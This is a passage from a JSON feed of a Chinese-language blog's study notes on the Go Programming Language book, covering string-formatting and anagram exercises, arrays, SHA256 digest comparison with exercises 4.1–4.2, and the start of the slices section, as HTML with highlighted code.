rune</span>\n\t\t<span class=\"token function\">println</span><span class=\"token punctuation\">(</span>cnt<span class=\"token punctuation\">,</span> <span class=\"token function\">string</span><span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\t\t<span class=\"token keyword\">if</span> cnt<span class=\"token operator\">%</span><span class=\"token number\">3</span> <span class=\"token operator\">==</span> sep <span class=\"token operator\">&amp;&amp;</span> cnt <span class=\"token operator\">!=</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">{</span> <span class=\"token comment\">// 逗号的位置为 sep + 3n</span>\n\t\t\tbuf<span class=\"token punctuation\">.</span><span class=\"token function\">WriteString</span><span class=\"token punctuation\">(</span><span class=\"token string\">\",\"</span><span class=\"token punctuation\">)</span>\n\t\t<span class=\"token punctuation\">}</span>\n\t\tbuf<span class=\"token punctuation\">.</span><span class=\"token function\">WriteRune</span><span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">)</span>\n\t\tcnt<span class=\"token operator\">++</span>\n\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token keyword\">return</span> buf<span class=\"token punctuation\">.</span><span class=\"token function\">String</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n\n</code></pre></div><h3>练习 3.11</h3>\n<p>完善comma函数，以支持浮点数处理和一个可选的正负号的处理。</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token keyword\">package</span> main\n\n<span class=\"token keyword\">import</span> <span class=\"token punctuation\">(</span>\n\t<span class=\"token string\">\"bytes\"</span>\n\t<span class=\"token string\">\"fmt\"</span>\n\t<span class=\"token string\">\"strings\"</span>\n\t<span class=\"token string\">\"unicode/utf8\"</span>\n<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\ttestString <span class=\"token operator\">:=</span> <span class=\"token string\">\"-152215.23223456\"</span>\n\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>testString<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span>s <span class=\"token builtin\">string</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">string</span> <span class=\"token punctuation\">{</span>\n\t<span class=\"token comment\">// 处理符号</span>\n\tsymbol <span class=\"token operator\">:=</span> s<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span>\n\ts <span class=\"token operator\">=</span> s<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span>\n\t<span class=\"token comment\">// 处理浮点数</span>\n\tdotIndex <span class=\"token operator\">:=</span> strings<span class=\"token punctuation\">.</span><span class=\"token function\">LastIndex</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">,</span> <span class=\"token string\">\".\"</span><span class=\"token punctuation\">)</span>\n\tdecimals <span class=\"token operator\">:=</span> s<span class=\"token punctuation\">[</span>dotIndex<span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span> <span class=\"token comment\">// 小数部分</span>\n\t<span class=\"token function\">println</span><span class=\"token punctuation\">(</span>decimals<span class=\"token punctuation\">)</span>\n\ts <span class=\"token operator\">=</span> s<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span>dotIndex<span class=\"token punctuation\">]</span>\n\t<span class=\"token function\">println</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span>\n\t<span class=\"token comment\">// 整数部分buffer</span>\n\t<span class=\"token keyword\">var</span> buf1 bytes<span class=\"token punctuation\">.</span>Buffer\n\tbuf1<span class=\"token punctuation\">.</span><span class=\"token function\">WriteByte</span><span class=\"token punctuation\">(</span>symbol<span class=\"token punctuation\">)</span>\n\ta <span class=\"token operator\">:=</span> <span class=\"token function\">comma</span><span class=\"token punctuation\">(</span>buf1<span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">)</span>\n\t<span class=\"token function\">println</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span>\n\t<span class=\"token comment\">// 小数部分buffer</span>\n\t<span class=\"token keyword\">var</span> buf2 bytes<span class=\"token punctuation\">.</span>Buffer\n\tb <span class=\"token operator\">:=</span> <span class=\"token function\">comma</span><span class=\"token punctuation\">(</span>buf2<span class=\"token punctuation\">,</span> decimals<span class=\"token punctuation\">)</span>\n\t<span class=\"token function\">println</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span>\n\t<span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span>a <span class=\"token operator\">+</span> b<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">comma</span><span class=\"token punctuation\">(</span>buf bytes<span class=\"token punctuation\">.</span>Buffer<span class=\"token punctuation\">,</span> s <span class=\"token builtin\">string</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">string</span> <span class=\"token punctuation\">{</span>\n\truneCnt <span class=\"token operator\">:=</span> utf8<span class=\"token punctuation\">.</span><span class=\"token function\">RuneCountInString</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span>\n\tsep <span class=\"token operator\">:=</span> runeCnt <span class=\"token operator\">%</span> <span class=\"token number\">3</span>\n\tcnt <span class=\"token operator\">:=</span> <span class=\"token number\">0</span>\n\t<span class=\"token keyword\">for</span> <span class=\"token boolean\">_</span><span class=\"token punctuation\">,</span> r <span class=\"token operator\">:=</span> <span class=\"token keyword\">range</span> s <span class=\"token punctuation\">{</span>\n\t\t<span class=\"token comment\">// r is rune</span>\n\t\t<span class=\"token keyword\">if</span> cnt<span class=\"token operator\">%</span><span class=\"token number\">3</span> <span class=\"token operator\">==</span> sep <span class=\"token operator\">&amp;&amp;</span> cnt <span class=\"token operator\">!=</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">{</span> <span class=\"token comment\">// 每个逗号的位置为 sep + 3n</span>\n\t\t\tbuf<span class=\"token punctuation\">.</span><span class=\"token function\">WriteString</span><span class=\"token punctuation\">(</span><span class=\"token string\">\",\"</span><span class=\"token punctuation\">)</span>\n\t\t<span class=\"token punctuation\">}</span>\n\t\tbuf<span class=\"token punctuation\">.</span><span class=\"token function\">WriteRune</span><span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">)</span>\n\t\tcnt<span class=\"token operator\">++</span>\n\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token keyword\">return</span> buf<span class=\"token punctuation\">.</span><span class=\"token function\">String</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n\n</code></pre></div><h3>练习 3.12</h3>\n<p>编写一个函数，判断两个字符串是否是相互打乱的，也就是说它们有着相同的字符，但是对应不同的顺序。</p>\n<p>这里有一个函数<code>reflect.DeepEqual(m1, m2)</code></p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token keyword\">package</span> main\n\n<span class=\"token keyword\">import</span> <span class=\"token punctuation\">(</span>\n\t<span class=\"token string\">\"fmt\"</span>\n\t<span class=\"token string\">\"reflect\"</span>\n<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span><span class=\"token function\">containCharsEqual</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"hahaqwe\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"ahewqah\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">containCharsEqual</span><span class=\"token punctuation\">(</span>s1<span class=\"token punctuation\">,</span> s2 <span class=\"token builtin\">string</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">bool</span> <span class=\"token punctuation\">{</span>\n\t<span class=\"token keyword\">if</span> <span class=\"token function\">len</span><span class=\"token punctuation\">(</span>s1<span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token function\">len</span><span class=\"token punctuation\">(</span>s2<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t\t<span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span>\n\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token comment\">// NOTE: 统计字符出现次数，放到两个map里</span>\n\tm1 <span class=\"token operator\">:=</span> <span class=\"token function\">make</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">map</span><span class=\"token punctuation\">[</span><span class=\"token builtin\">rune</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span>\n\tm2 <span class=\"token operator\">:=</span> <span class=\"token function\">make</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">map</span><span class=\"token punctuation\">[</span><span class=\"token builtin\">rune</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span>\n\t<span class=\"token keyword\">for</span> <span class=\"token boolean\">_</span><span class=\"token punctuation\">,</span> r <span class=\"token operator\">:=</span> <span class=\"token keyword\">range</span> s1 <span class=\"token punctuation\">{</span>\n\t\tm1<span class=\"token punctuation\">[</span>r<span class=\"token punctuation\">]</span><span class=\"token operator\">++</span>\n\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token keyword\">for</span> <span class=\"token boolean\">_</span><span class=\"token punctuation\">,</span> r <span class=\"token operator\">:=</span> <span class=\"token keyword\">range</span> s2 <span class=\"token punctuation\">{</span>\n\t\tm2<span class=\"token punctuation\">[</span>r<span class=\"token punctuation\">]</span><span class=\"token operator\">++</span>\n\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token comment\">// NOTE: 新函数 判断是否深度相等</span>\n\t<span class=\"token keyword\">return</span> reflect<span class=\"token punctuation\">.</span><span class=\"token function\">DeepEqual</span><span class=\"token punctuation\">(</span>m1<span class=\"token punctuation\">,</span> m2<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n\n</code></pre></div>",
      "date_published": "2024-07-31T08:52:23.000Z",
      "date_modified": "2024-07-31T08:52:23.000Z",
      "authors": [],
      "tags": []
    },
    {
      "title": "04. 复合数据类型",
      "url": "https://echo0d.github.io/DailyNotes/develop/Go/gopl/ch4.html",
      "id": "https://echo0d.github.io/DailyNotes/develop/Go/gopl/ch4.html",
      "summary": "04. 复合数据类型\n\n主要讨论四种类型——数组、slice、map和结构体\n演示如何使用结构体来解码和编码到对应JSON格式的数据，并且通过结合使用模板来生成HTML页面。\n\n数组和结构体是聚合类型，它们的值由许多元素或成员字段的值组成。\n数组是由同构的元素组成——每个数组元素都是完全相同的类型——结构体则是由异构的元素组成的。数组和结构体都是有固定...",
      "content_html": "\n<ul>\n<li>主要讨论四种类型——数组、slice、map和结构体</li>\n<li>演示如何使用结构体来解码和编码到对应JSON格式的数据，并且通过结合使用模板来生成HTML页面。</li>\n</ul>\n<p>数组和结构体是聚合类型，它们的值由许多元素或成员字段的值组成。</p>\n<p>数组是由同构的元素组成——每个数组元素都是完全相同的类型——结构体则是由异构的元素组成的。数组和结构体都是有固定内存大小的数据结构。相比之下，slice和map则是动态的数据结构，它们将根据需要动态增长。</p>\n<h2>4.1. 数组</h2>\n<ul>\n<li>数组是一个由固定长度的特定类型元素组成的序列，一个数组可以由零个或多个元素组成。</li>\n<li>数组的每个元素可以通过索引下标来访问，索引下标的范围是从0开始到数组长度减1的位置。</li>\n<li>内置的len函数将返回数组中元素的个数。</li>\n</ul>\n<p>因为数组的长度是固定的，因此在Go语言中很少直接使用数组。和数组对应的类型是Slice（切片），它是可以增长和收缩的动态序列，slice功能也更灵活，但是要理解slice工作原理的话需要先理解数组。</p>\n<h3>数组定义</h3>\n<p>默认情况下，数组的每个元素都被初始化为元素类型对应的零值，对于数字类型来说就是0。</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>var a [3]int             // array of 3 integers\nfmt.Println(a[0])        // print the first element\nfmt.Println(a[len(a)-1]) // print the last element, a[2]\n\n// Print the indices and elements.\nfor i, v := range a {\n    fmt.Printf(\"%d %d\\n\", i, v)\n}\n\n// Print the elements only.\nfor _, v := range a {\n    fmt.Printf(\"%d\\n\", v)\n}\n</code></pre></div><p>我们也可以使用数组字面值语法用一组值来初始化数组：</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>\tvar q [3]int = [3]int{1, 2, 3}\n\tvar r [3]int = [3]int{1, 2}\n\tfmt.Println(q[1]) // \"2\"\n\tfmt.Println(r[2]) // \"0\"\n</code></pre></div><p>如果在数组的长度位置出现的是“...”省略号，则表示数组的长度是根据初始化值的个数来计算。因此，上面q数组的定义可以简化为</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>q := [...]int{1, 2, 3}\nfmt.Printf(\"%T\\n\", q) // \"[3]int\"\n</code></pre></div><h3>数组长度</h3>\n<p>数组的长度是数组类型的一个组成部分，因此[3]int和[4]int是两种不同的数组类型。数组的长度必须是常量表达式，因为数组的长度需要在编译阶段确定。</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>q := [3]int{1, 2, 3}\nq = [4]int{1, 2, 3, 4} // compile error: cannot assign [4]int to [3]int\n</code></pre></div><h3>数组-键值对</h3>\n<p>上面的形式是直接提供顺序初始化值序列，但是也可以指定一个索引和对应值列表的方式初始化，就像下面这样：</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>type Currency int\n\nconst (\n    USD Currency = iota // 美元\n    EUR                 // 欧元\n    GBP                 // 英镑\n    RMB                 // 人民币\n)\n\nsymbol := [...]string{USD: \"$\", EUR: \"€\", GBP: \"￡\", RMB: \"￥\"}\n\nfmt.Println(RMB, symbol[RMB]) // \"3 ￥\"\n</code></pre></div><p>在这种形式的数组字面值形式中，初始化索引的顺序是无关紧要的，而且没用到的索引可以省略，和前面提到的规则一样，未指定初始值的元素将用零值初始化。例如，</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>r := [...]int{99: -1}\n// 定义了一个含有100个元素的数组r，最后一个元素被初始化为-1，其它元素都是用0初始化。\n</code></pre></div><figure><figcaption>image-20240422173219723</figcaption></figure>\n<h3>数组比较</h3>\n<p>只有数组的数据类型完全相同，两个数组才能比较；可以直接通过==比较运算符来比较两个数组，只有当两个数组的所有元素都是相等的时候数组才是相等的。不相等比较运算符!=遵循同样的规则。</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>a := [2]int{1, 2}\nb := [...]int{1, 2}\nc := [2]int{1, 3}\nfmt.Println(a == b, a == c, b == c) // \"true false false\"\nd := [3]int{1, 2}\nfmt.Println(a == d) // compile error: cannot compare [2]int == [3]int\n</code></pre></div><p>下面的例子用SHA256算法分别生成“x”和“X”两个信息的摘要：</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>import \"crypto/sha256\"\n\nfunc main() {\n    c1 := sha256.Sum256([]byte(\"x\"))\n    c2 := sha256.Sum256([]byte(\"X\"))\n    // Printf函数的%x以十六进制 %t打印布尔型数据，%T用于显示一个值对应的数据类型。\n    fmt.Printf(\"%x\\n%x\\n%t\\n%T\\n\", c1, c2, c1 == c2, c1)\n    // Output:\n    // 2d711642b726b04401627ca9fbac32f5c8530fb1903cc4db02258717921a4881\n    // 4b68ab3847feda7d6c62c1fbcbeebfa35eab7351ed5e78f4ddadea5df64b8015\n    // false\n    // [32]uint8\n}\n</code></pre></div><p>如果写成这样</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code>fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%v\\n%v\\n%v\\n%T\\n\"</span><span class=\"token punctuation\">,</span> c1<span class=\"token punctuation\">,</span> c2<span class=\"token punctuation\">,</span> c1 <span class=\"token operator\">==</span> c2<span class=\"token punctuation\">,</span> c1<span class=\"token punctuation\">)</span>\n</code></pre></div><p>将会输出如下，所以能够看出，c1 c2本身是一个十进制数组。</p>\n<figure><figcaption>image-20240422175054597</figcaption></figure>\n<p>上面例子中，两个消息虽然只有一个字符的差异，但是生成的消息摘要则几乎有一半的bit位是不相同的。</p>\n<h3>练习 4.1</h3>\n<p>编写一个函数，计算两个SHA256哈希码中不同bit的数目。（参考2.6.2节的PopCount函数。)</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code>\n<span class=\"token comment\">// NOTE: 练习 4.1： 编写一个函数，计算两个SHA256哈希码中不同bit的数目。</span>\n\n<span class=\"token keyword\">type</span> SHA256 <span class=\"token punctuation\">[</span><span class=\"token number\">32</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">byte</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\tmd1<span class=\"token punctuation\">,</span> md2 <span class=\"token operator\">:=</span> SHA256<span class=\"token punctuation\">{</span><span class=\"token number\">14</span><span class=\"token punctuation\">:</span> <span class=\"token number\">252</span><span class=\"token punctuation\">,</span> <span class=\"token number\">31</span><span class=\"token punctuation\">:</span> <span class=\"token number\">8</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> SHA256<span class=\"token punctuation\">{</span><span class=\"token number\">31</span><span class=\"token punctuation\">:</span> <span class=\"token number\">5</span><span class=\"token punctuation\">}</span>\n\t<span class=\"token function\">bitDiff</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>md1<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>md2<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">bitDiff</span><span class=\"token punctuation\">(</span>md1<span class=\"token punctuation\">,</span> md2 <span class=\"token operator\">*</span>SHA256<span class=\"token punctuation\">)</span> <span class=\"token builtin\">int</span> <span class=\"token punctuation\">{</span>\n\tdiffCnt <span class=\"token operator\">:=</span> <span class=\"token number\">0</span>\n\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"  sha1  \\t  sha2 \"</span><span class=\"token punctuation\">)</span>\n\t<span class=\"token keyword\">for</span> i <span class=\"token operator\">:=</span> <span class=\"token keyword\">range</span> md1 <span class=\"token punctuation\">{</span>\n\t\tb1 <span class=\"token operator\">:=</span> md1<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span>\n\t\tb2 <span class=\"token operator\">:=</span> md2<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span>\n\t\t<span class=\"token keyword\">for</span> i <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">8</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span> <span class=\"token punctuation\">{</span>\n\t\t\t<span class=\"token comment\">// NOTE: get last bit of a byte</span>\n\t\t\tlb1<span class=\"token punctuation\">,</span> lb2 <span class=\"token operator\">:=</span> <span class=\"token punctuation\">(</span>b1<span class=\"token operator\">&gt;&gt;</span>i<span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>b2<span class=\"token operator\">&gt;&gt;</span>i<span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span><span class=\"token number\">1</span>\n\t\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>lb1 <span class=\"token operator\">^</span> lb2<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">{</span>\n\t\t\t\tdiffCnt<span class=\"token operator\">++</span>\n\t\t\t<span class=\"token punctuation\">}</span>\n\t\t<span class=\"token punctuation\">}</span>\n\t\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%08b\\t%08b\\n\"</span><span class=\"token punctuation\">,</span> b1<span class=\"token punctuation\">,</span> b2<span class=\"token punctuation\">)</span>\n\t<span class=\"token punctuation\">}</span>\n\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"bit diff count: %d\\n\"</span><span class=\"token punctuation\">,</span> diffCnt<span class=\"token punctuation\">)</span>\n\t<span class=\"token keyword\">return</span> diffCnt\n<span class=\"token punctuation\">}</span>\n\n</code></pre></div><h3>练习 4.2</h3>\n<p>编写一个程序，默认情况下打印标准输入的SHA256编码，并支持通过命令行flag定制，输出SHA384或SHA512哈希算法。flag包：<a href=\"https://pkg.go.dev/flag\" target=\"_blank\" rel=\"noopener noreferrer\">flag package - flag - Go Packages</a></p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token keyword\">package</span> main\n\n<span class=\"token keyword\">import</span> <span class=\"token punctuation\">(</span>\n\t<span class=\"token string\">\"crypto/sha256\"</span>\n\t<span class=\"token string\">\"crypto/sha512\"</span>\n\t<span class=\"token string\">\"flag\"</span>\n\t<span class=\"token string\">\"fmt\"</span>\n\t<span class=\"token string\">\"os\"</span>\n<span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\">// NOTE: 练习 4.2： 编写一个程序，默认情况下打印标准输入的SHA256编码，并支持通过命令行flag定制，输出SHA384或SHA512哈希算法。</span>\n<span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t<span class=\"token keyword\">var</span> shaType <span class=\"token builtin\">string</span>\n\t<span class=\"token comment\">// 命令参数shaType，默认SHA256</span>\n\tflag<span class=\"token punctuation\">.</span><span class=\"token function\">StringVar</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>shaType<span class=\"token punctuation\">,</span> <span class=\"token string\">\"shaType\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"SHA256\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"SHA256（default）or SHA384 or SHA512\"</span><span class=\"token punctuation\">)</span>\n\tflag<span class=\"token punctuation\">.</span><span class=\"token function\">Parse</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\t<span class=\"token keyword\">for</span> <span class=\"token boolean\">_</span><span class=\"token punctuation\">,</span> s <span class=\"token operator\">:=</span> <span class=\"token keyword\">range</span> flag<span class=\"token punctuation\">.</span><span class=\"token function\">Args</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t\tresultStr <span class=\"token operator\">:=</span> <span class=\"token string\">\"\"</span>\n\t\t<span class=\"token keyword\">switch</span> shaType <span class=\"token punctuation\">{</span>\n\t\t<span class=\"token keyword\">case</span> <span class=\"token string\">\"SHA256\"</span><span class=\"token punctuation\">:</span>\n\t\t\tc <span class=\"token operator\">:=</span> sha256<span class=\"token punctuation\">.</span><span class=\"token function\">Sum256</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token function\">byte</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\t\t\tresultStr <span class=\"token operator\">=</span> fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Sprintf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%x\"</span><span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">)</span>\n\t\t<span class=\"token keyword\">case</span> <span class=\"token string\">\"SHA384\"</span><span class=\"token punctuation\">:</span>\n\t\t\tc <span class=\"token operator\">:=</span> sha512<span class=\"token punctuation\">.</span><span class=\"token function\">Sum384</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token function\">byte</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\t\t\tresultStr <span class=\"token operator\">=</span> fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Sprintf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%x\"</span><span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">)</span>\n\t\t<span class=\"token keyword\">case</span> <span class=\"token string\">\"SHA512\"</span><span class=\"token punctuation\">:</span>\n\t\t\tc <span class=\"token operator\">:=</span> sha512<span class=\"token punctuation\">.</span><span class=\"token function\">Sum512</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token function\">byte</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\t\t\tresultStr <span class=\"token operator\">=</span> fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Sprintf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%x\"</span><span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">)</span>\n\t\t<span class=\"token keyword\">default</span><span class=\"token punctuation\">:</span>\n\t\t\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Hash Type %s 不支持，SHA256（default）or SHA384 or SHA512\\n\"</span><span class=\"token punctuation\">,</span> shaType<span class=\"token punctuation\">)</span>\n\t\t\tos<span class=\"token punctuation\">.</span><span class=\"token function\">Exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n\t\t<span class=\"token punctuation\">}</span>\n\t\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"str:%s\\tshaType:%s\\t sha:%s\\n\"</span><span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">,</span> shaType<span class=\"token punctuation\">,</span> resultStr<span class=\"token punctuation\">)</span>\n\t<span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n</code></pre></div><h2>4.2. Slice</h2>\n<h4>Slice结构</h4>\n<p>数组是一个由固定长度的特定类型元素组成的序列，而Slice（切片）代表变长的序列，序列中每个元素都有相同的类型。slice类型一般写作<code>[]T</code>，其中T代表slice中元素的类型。</p>\n<p>一个slice由三个部分构成：指针、长度和容量。指针指向第一个slice元素对应的底层数组元素的地址；长度对应slice中元素的数目，长度不能超过容量；容量一般是从slice的开始位置到底层数据的结尾位置。内置的len和cap函数分别返回slice的长度和容量。</p>\n<h4>切片操作</h4>\n<p>数组这样定义</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>months := [...]string{1: \"January\", /* ... */, 12: \"December\"}\n</code></pre></div><p>一月份是months[1]，十二月份是months[12]。这里声明数组时直接跳过第0个元素，第0个元素会被自动初始化为空字符串。</p>\n<p>slice的切片操作<code>s[i:j]</code>，其中<code>0 ≤ i≤ j≤ cap(s)</code>，表示创建一个新的slice，引用s的从第i个元素开始到第j-1个元素的子序列。新的slice将只有j-i个元素。如果i位置的索引被省略的话将使用0代替，如果j位置的索引被省略的话将使用len(s)代替。例如</p>\n<ul>\n<li>months[1:13]切片操作将引用全部有效的月份，和months[1:]操作等价；</li>\n<li>months[:]切片操作则是引用整个数组。</li>\n</ul>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code>Q2 <span class=\"token operator\">:=</span> months<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span>\nsummer <span class=\"token operator\">:=</span> months<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span>\nfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span>Q2<span class=\"token punctuation\">)</span>     <span class=\"token comment\">// [\"April\" \"May\" \"June\"]</span>\nfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span>summer<span class=\"token punctuation\">)</span> <span class=\"token comment\">// [\"June\" \"July\" \"August\"]</span>\n\n<span class=\"token comment\">// 两个slice都包含了六月份</span>\n<span class=\"token keyword\">for</span> <span class=\"token boolean\">_</span><span class=\"token punctuation\">,</span> s <span class=\"token operator\">:=</span> <span class=\"token keyword\">range</span> summer <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">for</span> <span class=\"token boolean\">_</span><span class=\"token punctuation\">,</span> q <span class=\"token operator\">:=</span> <span class=\"token keyword\">range</span> Q2 <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">if</span> s <span class=\"token operator\">==</span> q <span class=\"token punctuation\">{</span>\n            fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Printf</span><span class=\"token 